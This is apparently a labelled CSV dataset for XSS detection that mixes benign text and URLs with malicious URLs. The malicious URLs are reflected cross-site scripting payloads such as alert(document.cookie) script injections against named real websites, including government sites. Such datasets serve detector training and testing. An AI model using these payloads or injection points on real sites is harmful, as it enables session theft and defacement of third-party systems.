Payloads,Class,decoded,executed,parser_changed
"well worth the $297 (plus tax) we started out on the ground floor, the room stank of smoke. management accomo",Benign,"well worth the $297 (plus tax) we started out on the ground floor, the room stank of smoke. management accomo",False,False
http://www.ci.burnsville.mn.us/publiclogin.asp?txtredirect=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.ci.burnsville.mn.us/publiclogin.asp?txtredirect=""><script>alert(document.cookie)</script>",True,True
http://lawcrawler.findlaw.com/scripts/lc.pl?country=&amp;start=195&amp;lang=&amp;entry=missouri+adoption&amp;sites='<br>'&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;''&gt;&lt;h1&gt;djsedat%20narcoticxs&lt;/h1&gt;,Malicious,http://lawcrawler.findlaw.com/scripts/lc.pl?country=&start=195&lang=&entry=missouri adoption&sites=''></script><script>alert(document.cookie)</script>''><h1>djsedat narcoticxs</h1>,True,True
http://www.epa.state.il.us/events/phpinfo.php?a[]=&gt;&lt;script&gt;alert(/fuck-israel/);&lt;/script&gt;,Malicious,http://www.epa.state.il.us/events/phpinfo.php?a[]=><script>alert(/fuck-israel/);</script>,True,True
http://www.tehrantimes.com/index_services.asp?chid=247&amp;name=politics%27%22%3e%3c/title%3e%3cscript%3<br>ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.tehrantimes.com/index_services.asp?chid=247&name=politics'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
https://servicos.dpf.gov.br/sinpq/licenca?cnpj=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;submit=cons<br>ulta+por+cnpj&amp;tarefa=consultarcnpj&amp;licenca=,Malicious,"https://servicos.dpf.gov.br/sinpq/licenca?cnpj=""><script>alert(document.cookie)</script>&submit=consulta por cnpj&tarefa=consultarcnpj&licenca=",True,True
"good location, rooms as new stayed at this hotel for 1 night back on october 2 2006, at the end of our 3 month around the world trip.the hotel is going through a major renovation, and check in upgraded us to a newly renovated floor (12th) which was a nice gesture.rooms were very nice, with lcd tv and lovely king size beds.didnt eat at hotel, because generally find them all too pricey but there is a westfield accross the road with some nice restaraunts open at night.hotel has a hertz agency located in it, which was handy because we hired a car and drove around mailub, santa monica and beverley hills. the hotel is centrally located which is a major plus.also not too far to lax either.hope this helps",Benign,"good location, rooms as new stayed at this hotel for 1 night back on october 2 2006, at the end of our 3 month around the world trip.the hotel is going through a major renovation, and check in upgraded us to a newly renovated floor (12th) which was a nice gesture.rooms were very nice, with lcd tv and lovely king size beds.didnt eat at hotel, because generally find them all too pricey but there is a westfield accross the road with some nice restaraunts open at night.hotel has a hertz agency located in it, which was handy because we hired a car and drove around mailub, santa monica and beverley hills. the hotel is centrally located which is a major plus.also not too far to lax either.hope this helps",False,False
http://www.wikihow.com/build-a-mini-48-inch-flag-pole&t=1396563683372&n=2628578&k=mainentity,Benign,http://www.wikihow.com/build-a-mini-48-inch-flag-pole&t=1396563683372&n=2628578&k=mainentity,False,False
insertar&precio=544&b1=confirmar,Benign,insertar&precio=544&b1=confirmar,False,False
http://pouvoirslocaux.wallonie.be/jahia/jahia/enginename/search/pid/2?search=%22%27%2f%3e%3cscript%3<br>ealert%28%27hello+the+rat%27%29%3c%2fscript%3e&amp;maxpageitems=10&amp;pagesearchresultbuilder.onlyonehitbyp<br>age=false&amp;searchview=simple&amp;freesearch=&amp;searchhandler=search&amp;go=rechercher,Malicious,"http://pouvoirslocaux.wallonie.be/jahia/jahia/enginename/search/pid/2?search=""'/><script>alert('hello the rat')</script>&maxpageitems=10&pagesearchresultbuilder.onlyonehitbypage=false&searchview=simple&freesearch=&searchhandler=search&go=rechercher",True,True
http://www-cgi.hrz.tu-darmstadt.de/harvest/cgi-bin/nph-search.cgi?broker=%22%3e%3cscript%3ealert(%22<br>pwnd%20for%20big-h%20(;%22)%3c/script%3e,Malicious,"http://www-cgi.hrz.tu-darmstadt.de/harvest/cgi-bin/nph-search.cgi?broker=""><script>alert(""pwnd for big-h (;"")</script>",True,True
"loved it we stayed in nusa dua beach hotel for our anniversary. the lawn and garden is excellent. staff very nice, service are personal. they leave us with a message in the room before the check-out",Benign,"loved it we stayed in nusa dua beach hotel for our anniversary. the lawn and garden is excellent. staff very nice, service are personal. they leave us with a message in the room before the check-out",False,False
http://www.mobile.mediaset.it/sso/lostpassword.php?error_code=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&amp;check_co<br>de=,Malicious,"http://www.mobile.mediaset.it/sso/lostpassword.php?error_code=""><script>alert(123)</script>&check_code=",True,True
http://www.spacetrace.org/register.php?email=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;lang=en&amp;otherlang=en&amp;name=<br>tionilla&amp;planet=nonation&amp;username=tionilla&amp;race=5&amp;withstartingfleet=1&amp;startingfleet_id=8&amp;realname=&amp;t<br>own=&amp;timezone=%2b1&amp;age=0&amp;gender=&amp;find=url&amp;url%5b%5d=&amp;accept=on&amp;screenh=534&amp;screenw=1020&amp;register=%a0<br>%a0register%a0%a0&amp;javascripton=1,Malicious,"http://www.spacetrace.org/register.php?email=""><script>alert(1);</script>&lang=en&otherlang=en&name=tionilla&planet=nonation&username=tionilla&race=5&withstartingfleet=1&startingfleet_id=8&realname=&town=&timezone= 1&age=0&gender=&find=url&url[]=&accept=on&screenh=534&screenw=1020®ister=��register��&javascripton=1",True,True
http://www.stuhrling.com/faq.cfm?parorder=7%22%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious,"http://www.stuhrling.com/faq.cfm?parorder=7""><script>alert(1337)</script>",True,True
http://www.dilg.gov.ph/issuance.php?issuancetype=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.dilg.gov.ph/issuance.php?issuancetype=""><script>alert(document.cookie)</script>",True,True
http://www.ugc.ac.in/inside/prof_uniwise.php?univ=dr.y.s.parmar%20univ.%20of%20agri.%20horticulture%<br>27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3<br>c/h1%3e%3c/marquee%3e,Malicious,"http://www.ugc.ac.in/inside/prof_uniwise.php?univ=dr.y.s.parmar univ. of agri. horticulture'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
"this hotel far exceeded my expectation this was such a beautifuil hotel. the location is in a very safe, pretty area, so close to universal studios!the rooms weren't huge, but they were more than comfortable, and very clean. all of the staff was very friendly, everytime i passed someone in the hallway, they would smile and greet me.the pool felt like a mini paradise. it was beautiful, and the water temp was perfect. i only spent about 30 min. a day down there, but it was just the relxation i needed.many different bus tours stop at the beverly garland, so if you are looking for a tour, you don't have to worry about finding a place to go, you just stand on the curb and the bus picks you up.even the little restaurant had great food, service was a little slow, but that only gave us more time to enjoy the out door patio that was beautiful!i would definitely stay here again!!",Benign,"this hotel far exceeded my expectation this was such a beautifuil hotel. the location is in a very safe, pretty area, so close to universal studios!the rooms weren't huge, but they were more than comfortable, and very clean. all of the staff was very friendly, everytime i passed someone in the hallway, they would smile and greet me.the pool felt like a mini paradise. it was beautiful, and the water temp was perfect. i only spent about 30 min. a day down there, but it was just the relxation i needed.many different bus tours stop at the beverly garland, so if you are looking for a tour, you don't have to worry about finding a place to go, you just stand on the curb and the bus picks you up.even the little restaurant had great food, service was a little slow, but that only gave us more time to enjoy the out door patio that was beautiful!i would definitely stay here again!!",False,False
http://getfar.org/newsdetail.php?id=%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious,"http://getfar.org/newsdetail.php?id=""></title><script>alert(1)</script>",True,True
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=minnesot&pwd=de7hebillar&remember=off&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=minnesot&pwd=de7hebillar&remember=off&b1=entrar,False,False
http://www.sgluc.ch/francais/newsdetail.php?id=%27%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/s<br>cript%3e,Malicious,"http://www.sgluc.ch/francais/newsdetail.php?id=''""></title><script>alert(1)</script>",True,True
http://bugs.mysql.com/search.php?bug_age=0&amp;bug_type=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/script&gt;,Malicious,"http://bugs.mysql.com/search.php?bug_age=0&bug_type=""><script>alert(""fugitif"")</script>",True,True
"Decent stay but could have been better We were in NYC for the US Open for labor day weekend. We picked this hotel cuz there were three of us including a 17 year old and most hotels wouldn't allow all three of us to be in one room. We were tempted to try out the Embassy suites near Wall Street coz it was cheaper and roomier but decided to settle for the Marriott coz we have Elite membership and we get points. The location was a contributing factor for this decision as well. It was a bit tight especially when the pull out bed was open. Room was clean and they have a full size refrigerator in the room with ice maker. Bed is comfortable and the linens were top notch quality. Pull out bed was not bad either. Closet space is very limited. Safe in closet fits laptop. Free internet access in rooms not wi-fi though. We paid $330 per night and includes breakfast. Breakfast is pretty decent - eggs, sausage, waffles and all the other regular stuff. Location is great - close to theaters and 30 seconds from subway. Valet parking or nightly parking is $48 per night. If you take your car out during the day and check it back in, that's an extra $48. We were disappointed coz we asked for early check-in yet when we got there around 1 pm, the room was not ready. They said they would call when the room was ready but didn't. So we came back at 3:40 pm and they gave us the keys. Also we requested an extra hour for late check out - 12 noon instead of 11 am but they flat out refused. If they are that adamant about that then they should be able to accomo",Benign,"Decent stay but could have been better We were in NYC for the US Open for labor day weekend. We picked this hotel cuz there were three of us including a 17 year old and most hotels wouldn't allow all three of us to be in one room. We were tempted to try out the Embassy suites near Wall Street coz it was cheaper and roomier but decided to settle for the Marriott coz we have Elite membership and we get points. The location was a contributing factor for this decision as well. It was a bit tight especially when the pull out bed was open. Room was clean and they have a full size refrigerator in the room with ice maker. Bed is comfortable and the linens were top notch quality. Pull out bed was not bad either. Closet space is very limited. Safe in closet fits laptop. Free internet access in rooms not wi-fi though. We paid $330 per night and includes breakfast. Breakfast is pretty decent - eggs, sausage, waffles and all the other regular stuff. Location is great - close to theaters and 30 seconds from subway. Valet parking or nightly parking is $48 per night. If you take your car out during the day and check it back in, that's an extra $48. We were disappointed coz we asked for early check-in yet when we got there around 1 pm, the room was not ready. They said they would call when the room was ready but didn't. So we came back at 3:40 pm and they gave us the keys. Also we requested an extra hour for late check out - 12 noon instead of 11 am but they flat out refused. If they are that adamant about that then they should be able to accomo",False,False
"much maligned, great place for family vacation after reading some of the reviews preceding our stay i was pretty concerned that i hadn't made the best selection, but i was pleasantly surprised by our experience at this resort. it's beautifully landscaped, the service was friendly and helpful. we requested an updated suite upon early check-in and were given a squeaky clean, well-situated suite. plenty of room and privacy for two adults and two 14-year-olds. it's a perfect resort for those with children or teens because there are so many pools and activities, especially the golf. i was worried that we should have gone to the pointe hilton tapatio cliffs, but after a visit there for lunch we all agreed that squaw peak was superior for our needs.the food is a bit pricey, but that's typical of a resort. we made our way down the block three times to aunt chilada's for lunch and dinner which is a fun, affordable and delicious alternative to the restaurants onsite. the concierge staff was extremely helpful in giving us restaurant recommendations and maps.i would definitely stay here again!",Benign,"much maligned, great place for family vacation after reading some of the reviews preceding our stay i was pretty concerned that i hadn't made the best selection, but i was pleasantly surprised by our experience at this resort. it's beautifully landscaped, the service was friendly and helpful. we requested an updated suite upon early check-in and were given a squeaky clean, well-situated suite. plenty of room and privacy for two adults and two 14-year-olds. it's a perfect resort for those with children or teens because there are so many pools and activities, especially the golf. i was worried that we should have gone to the pointe hilton tapatio cliffs, but after a visit there for lunch we all agreed that squaw peak was superior for our needs.the food is a bit pricey, but that's typical of a resort. we made our way down the block three times to aunt chilada's for lunch and dinner which is a fun, affordable and delicious alternative to the restaurants onsite. the concierge staff was extremely helpful in giving us restaurant recommendations and maps.i would definitely stay here again!",False,False
"great time, excellent amenities slight problem with the reservation. when we called in march the week before we were to arrive, they told us that our reservation change (made in december) was not listed anywhere in their files. the reservations agent was pleasant, but said he couldnt change the reservation and we would have to check out a day earlier than planned. since this was a reward trip, we were upset but just had him book a room for one night in sedona (since we were going there anyway)my wife checked in on monday afternoon with the kids. she asked for and got an upgrade to a casita. she asked when we were checking out, and they had the change in place (magic?). she didn't say a word, just cancelled the sedona reservation. i arrived in the evening and was very impressed with the casita. the ground floor had a full kitchen and dinning room, half bath plus a living room with fold out bed and tv. you walk upstairs to a bedroom and full bath, with a private balcony off of the bedroom.while we did have a car, i dont understand why previous posters said there was nothing within walking distance other than aunt chilada's. there was a strip shopping center just across the street with a chinese carryout and some sort of sports bar. 1/2 mile away was a drug strore/liquor store and across the street from that was a supermarket.the kids enjoyed the lazy river, tubes and minature golf. we ended up buying the resort package, although the golf would have been free since we were diamond level, but i was sending and receiving large faxes and it made doing this more economical. both restaurants were open. no complaints about the food. i read these posts and always wonder about the resorts - some people are very negative, some are very positive. i have found a balanced report is more telling. just my $ 0.02",Benign,"great time, excellent amenities slight problem with the reservation. when we called in march the week before we were to arrive, they told us that our reservation change (made in december) was not listed anywhere in their files. the reservations agent was pleasant, but said he couldnt change the reservation and we would have to check out a day earlier than planned. since this was a reward trip, we were upset but just had him book a room for one night in sedona (since we were going there anyway)my wife checked in on monday afternoon with the kids. she asked for and got an upgrade to a casita. she asked when we were checking out, and they had the change in place (magic?). she didn't say a word, just cancelled the sedona reservation. i arrived in the evening and was very impressed with the casita. the ground floor had a full kitchen and dinning room, half bath plus a living room with fold out bed and tv. you walk upstairs to a bedroom and full bath, with a private balcony off of the bedroom.while we did have a car, i dont understand why previous posters said there was nothing within walking distance other than aunt chilada's. there was a strip shopping center just across the street with a chinese carryout and some sort of sports bar. 1/2 mile away was a drug strore/liquor store and across the street from that was a supermarket.the kids enjoyed the lazy river, tubes and minature golf. we ended up buying the resort package, although the golf would have been free since we were diamond level, but i was sending and receiving large faxes and it made doing this more economical. both restaurants were open. no complaints about the food. i read these posts and always wonder about the resorts - some people are very negative, some are very positive. i have found a balanced report is more telling. just my $ 0.02",False,False
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=viviana&password=%edd%24em&nombre=zara&apellidos=morer+rami%f3&email=ahlstadt%40viajesinternacionales.mil&dni=03271801m&direccion=sicardo+139%2c+10-b&ciudad=madrigueras&cp=27736&provincia=%c1vila&ntc=4315753990410491&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=viviana&password=�d$em&nombre=zara&apellidos=morer rami�&email=ahlstadt@viajesinternacionales.mil&dni=03271801m&direccion=sicardo 139, 10-b&ciudad=madrigueras&cp=27736&provincia=�vila&ntc=4315753990410491&b1=registrar",False,False
http://www.wikihow.com/plan-a-romantic-wedding-night&t=1396630825637&n=5465742&k=mainentity,Benign,http://www.wikihow.com/plan-a-romantic-wedding-night&t=1396630825637&n=5465742&k=mainentity,False,False
http://www.grenzpendler.dk/news_detail.php?lang=1&amp;cid=6&amp;nid=%22%3e%3cscript%3ealert(document.cookie)<br>%3c/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.grenzpendler.dk/news_detail.php?lang=1&cid=6&nid=""><script>alert(document.cookie)</script>><marquee><h1>meloulisi</h1></marquee>",True,True
registro&login=mang&password=golpeadura&nombre=shannen&apellidos=beneit+pao&email=voglis%40hiperxxx.au&dni=49511678s&direccion=garrotxa%2c+118+&ciudad=puebla+de+arenoso&cp=05530&provincia=la+rioja&ntc=9061531800144737&b1=registrar,Benign,"registro&login=mang&password=golpeadura&nombre=shannen&apellidos=beneit pao&email=voglis@hiperxxx.au&dni=49511678s&direccion=garrotxa, 118 &ciudad=puebla de arenoso&cp=05530&provincia=la rioja&ntc=9061531800144737&b1=registrar",False,False
"great location the hotel was in a great location for the walk of fame, chinese theatre, hollywood bowl universal studios. we were there 2 nights, the staff were very friendly helpful. the restaurant was good, we ate breakfast (included in room price) dinner there. the free shuttle to universal was very handy. would stay there if i was ever in hollywood again.",Benign,"great location the hotel was in a great location for the walk of fame, chinese theatre, hollywood bowl universal studios. we were there 2 nights, the staff were very friendly helpful. the restaurant was good, we ate breakfast (included in room price) dinner there. the free shuttle to universal was very handy. would stay there if i was ever in hollywood again.",False,False
http://www.maerkischer-kreis.de/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;,Malicious,"http://www.maerkischer-kreis.de/webcards/tools/calendar.php?month=""><script>alert(document.cookie)</script>",True,True
http://www.wikihow.com/create-your-very-own-first-aid-kit&t=1396631082765&n=5471093&k=mainentity,Benign,http://www.wikihow.com/create-your-very-own-first-aid-kit&t=1396631082765&n=5471093&k=mainentity,False,False
https://www.bwin.com/nl/debug/querybc3.aspx?tablename=%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,https://www.bwin.com/nl/debug/querybc3.aspx?tablename=<script>alert(document.cookie)</script>,True,True
http://www.wikihow.com/complete-moshi-missions-season-2-mission-3&t=1396648072432&n=5950159&k=mainentity,Benign,http://www.wikihow.com/complete-moshi-missions-season-2-mission-3&t=1396648072432&n=5950159&k=mainentity,False,False
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=artair9&pwd=escarnidor&remember=on&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=artair9&pwd=escarnidor&remember=on&b1=entrar,False,False
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mcgonagl&password=escol%e1stico&nombre=alom%edas&apellidos=bauz%e0+naval%f3n&email=zeiniker%40powerthink.tl&dni=46149643m&direccion=c%2f+huerta+del+ca%f1o%2c+195%2c+&ciudad=deltebre&cp=37450&provincia=burgos&ntc=7069765951057318&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mcgonagl&password=escol�stico&nombre=alom�as&apellidos=bauz� naval�n&email=zeiniker@powerthink.tl&dni=46149643m&direccion=c/ huerta del ca�o, 195, &ciudad=deltebre&cp=37450&provincia=burgos&ntc=7069765951057318&b1=registrar",False,False
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=timi&password=69226p9as6a&nombre=laurentino&apellidos=cabane+molas&email=carter%40redesmilitantes.no&dni=03374708x&direccion=calle+pozo%2c+108%2c+&ciudad=al%f2s+de+balaguer&cp=40395&provincia=valencia&ntc=3975166416915400&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=timi&password=69226p9as6a&nombre=laurentino&apellidos=cabane molas&email=carter@redesmilitantes.no&dni=03374708x&direccion=calle pozo, 108, &ciudad=al�s de balaguer&cp=40395&provincia=valencia&ntc=3975166416915400&b1=registrar",False,False
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9095&b1=pasar+por+caja,Benign,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9095&b1=pasar por caja,False,False
http://www.wikihow.com/get-ready-for-a-waterpark-trip&t=1396527908653&n=852961&k=mainentity,Benign,http://www.wikihow.com/get-ready-for-a-waterpark-trip&t=1396527908653&n=852961&k=mainentity,False,False
http://www.activedayton.com/beavercreek/restaurants/145605/usercomment.jspd?id=145605&amp;activity=ratin<br>g&amp;searchcriteriaurl=c2l0zwlkptexmdembglzdgluz3r5cgu9mtawmdembmvpz2hib3job29kawq9mtazndqwjmn1cnjlbnrw<br>ywdlpti=&amp;searchtype=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.activedayton.com/beavercreek/restaurants/145605/usercomment.jspd?id=145605&activity=rating&searchcriteriaurl=c2l0zwlkptexmdembglzdgluz3r5cgu9mtawmdembmvpz2hib3job29kawq9mtazndqwjmn1cnjlbnrwywdlpti=&searchtype=""></a><script>alert(document.cookie);</script>",True,True
http://kitty.9bis.com/%27%22%3e%3cscript%3ealert(1337)%3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20x<br>ylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://kitty.9bis.com/'""><script>alert(1337)</script><marquee><h1>xss by xylitol</h1></marquee>",True,True
